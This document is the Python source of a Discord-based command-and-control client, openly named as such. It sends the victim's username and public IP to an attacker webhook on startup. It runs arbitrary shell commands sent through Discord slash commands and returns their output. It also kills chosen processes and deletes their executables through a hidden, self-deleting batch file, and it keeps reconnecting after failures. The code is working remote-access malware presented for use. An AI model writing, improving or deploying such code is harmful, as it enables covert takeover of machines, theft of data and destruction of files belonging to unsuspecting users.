import discord
import os
import subprocess
import tempfile
import requests
import getpass
import sys
import asyncio
import random
import time
import json
from pathlib import Path
from typing import Optional

# --- Configuration ---
TOKEN = 'DISCORD_token'
GUILD_ID = 0
WEBHOOK_URL = 'discord_webhook'
# -------------------

MAX_FILE_SIZE = 25 * 1024 * 1024
intents = discord.Intents.default()
intents.message_content = True
CLIENT_ID_FILE = Path("client_id.json")

def get_client_id():
    """Loads a persistent client ID from a file, or generates and saves a new one."""
    if CLIENT_ID_FILE.exists():
        try:
            data = json.loads(CLIENT_ID_FILE.read_text())
            if 'client_id' in data:
                return data['client_id']
        except (json.JSONDecodeError, IOError):
            pass
    
    new_id = f"{random.randint(0, 0xFFFF):04X}"
    try:
        CLIENT_ID_FILE.write_text(json.dumps({'client_id': new_id}))
    except IOError:
        pass
    return new_id

class C2Client(discord.Client):
    def __init__(self, client_id, *, intents: discord.Intents):
        super().__init__(intents=intents)
        self.tree = discord.app_commands.CommandTree(self)
        self.client_id = client_id

    async def send_startup_notification(self):
        """Sends a connection message including the client ID to the webhook."""
        if not WEBHOOK_URL.startswith("https://discord.com/api/webhooks/"):
            return
        try:
            public_ip = requests.get('https://api.ipify.org', timeout=5).text
        except Exception:
            public_ip = "Unknown"
        username = getpass.getuser()
        embed = {
            "title": "New C2 Connection Established", "color": 0x00ff00,
            "fields": [
                {"name": "Username", "value": f"`{username}`", "inline": True},
                {"name": "Public IP", "value": f"`{public_ip}`", "inline": True},
                {"name": "Client ID", "value": f"**`{self.client_id}`**", "inline": True}
            ],
            "footer": {"text": "Client is online and awaiting commands."}
        }
        try:
            requests.post(WEBHOOK_URL, json={"embeds": [embed]}, timeout=10)
        except Exception:
            pass

    async def on_ready(self):
        guild = discord.Object(id=GUILD_ID)
        self.tree.copy_global_to(guild=guild)
        await self.tree.sync(guild=guild)
        await self.send_startup_notification()

client = C2Client(client_id=get_client_id(), intents=intents)

# --- Command Definitions ---
@client.tree.command(name="help", description="Shows help for all available commands.")
async def help(interaction: discord.Interaction):
    embed = discord.Embed(title="Multi-Client C2 Help", description="Use the `target_id` option to specify a client.", color=discord.Color.dark_red())
    embed.add_field(name="`/shell <command> [target_id]`", value="Executes a shell command. If no ID, broadcasts to all.", inline=False)
    embed.add_field(name="`/exit [target_id]`", value="Terminates the specified C2 client(s).", inline=False)
    embed.add_field(name="`/kill <process> [target_id]`", value="[Windows Only] Kills a process and self-destructs.", inline=False)
    embed.add_field(name="`/id`", value="Each client reports its own unique ID.", inline=False)
    await interaction.response.send_message(embed=embed, ephemeral=True)

@client.tree.command(name="id", description="Reports the client's unique ID.")
async def report_id(interaction: discord.Interaction):
    await interaction.response.send_message(f"My unique client ID is: **`{client.client_id}`**", ephemeral=True)

@client.tree.command(name="exit", description="Gracefully terminates the C2 client(s).")
async def exit_client(interaction: discord.Interaction, target_id: Optional[str] = None):
    if target_id and target_id.lower() != client.client_id.lower():
        return
    await interaction.response.send_message(f"Client `{client.client_id}` is shutting down.", ephemeral=True)
    await client.close()

@client.tree.command(name="kill", description="[Windows Only] Kills process, deletes exe, and self-destructs.")
async def kill(interaction: discord.Interaction, process_name: str, target_id: Optional[str] = None):
    # CORRECTED: Added the target ID check
    if target_id and target_id.lower() != client.client_id.lower():
        return
    
    await interaction.response.defer(thinking=True, ephemeral=True)
    if os.name != 'nt':
        await interaction.followup.send("This command is only available on Windows.", ephemeral=True)
        return
    try:
        import psutil
        pids, exe_paths = [], set()
        for proc in psutil.process_iter(['pid', 'name', 'exe']):
            if proc.info['name'] and proc.info['name'].lower() == process_name.lower():
                pids.append(proc.info['pid'])
                if proc.info['exe']:
                    exe_paths.add(proc.info['exe'])
        if not pids:
            await interaction.followup.send(f"No process named `{process_name}` found.", ephemeral=True)
            return

        bat_content = f"@echo off\ntimeout /t 2 /nobreak > NUL\n"
        for pid in pids:
            bat_content += f"taskkill /F /PID {pid}\n"
        for path in exe_paths:
            bat_content += f"del /F /Q \"{path}\"\n"
        bat_content += f"(goto) 2>nul & del \"%~f0\"\n"

        with tempfile.NamedTemporaryFile(mode='w', suffix='.bat', delete=False) as bat_file:
            bat_file.write(bat_content)
            bat_path = bat_file.name
        
        subprocess.Popen(['cmd.exe', '/c', bat_path], creationflags=subprocess.CREATE_NO_WINDOW)
        await interaction.followup.send(f"Kill sequence initiated for `{process_name}`.", ephemeral=True)
    except ImportError:
        await interaction.followup.send("Error: `psutil` library is not installed on the target.", ephemeral=True)
    except Exception as e:
        await interaction.followup.send(f"An error occurred during kill sequence: {str(e)}", ephemeral=True)

@client.tree.command(name="shell", description="Execute a shell command.")
async def shell(interaction: discord.Interaction, command: str, target_id: Optional[str] = None):
    # CORRECTED: Added the target ID check
    if target_id and target_id.lower() != client.client_id.lower():
        return

    await interaction.response.defer(thinking=True, ephemeral=True)
    tmp_file_path = None
    try:
        if command.strip().lower().startswith('cd '):
            directory = command.strip().split(' ', 1)[1]
            os.chdir(directory)
            await interaction.followup.send(f"Changed directory to: `{os.getcwd()}`", ephemeral=True)
            return

        with tempfile.NamedTemporaryFile(mode='w+', delete=False, suffix='.txt', encoding='utf-8', errors='replace') as tmp_file:
            tmp_file_path = tmp_file.name
            process = subprocess.Popen(command, shell=True, stdout=tmp_file, stderr=subprocess.STDOUT)
            process.wait(timeout=300)

        file_size = os.path.getsize(tmp_file_path)
        if file_size == 0:
            await interaction.followup.send("Command executed with no output.", ephemeral=True)
        elif file_size > MAX_FILE_SIZE:
            await interaction.followup.send(f"Output too large ({file_size/(1024*1024):.2f}MB). Limit is 25MB.", ephemeral=True)
        else:
            await interaction.followup.send(f"Output for: `{command}`", file=discord.File(tmp_file_path, filename="output.txt"), ephemeral=True)
    except Exception as e:
        await interaction.followup.send(f"An error occurred: {str(e)}", ephemeral=True)
    finally:
        if tmp_file_path and os.path.exists(tmp_file_path):
            os.remove(tmp_file_path)

# --- Main Execution Block with Reconnect Logic ---
if __name__ == '__main__':
    if TOKEN == 'YOUR_DISCORD_BOT_TOKEN' or GUILD_ID == 0:
        sys.exit()
    
    while True:
        try:
            client.run(TOKEN)
            break
        except Exception:
            time.sleep(random.randint(5, 20))

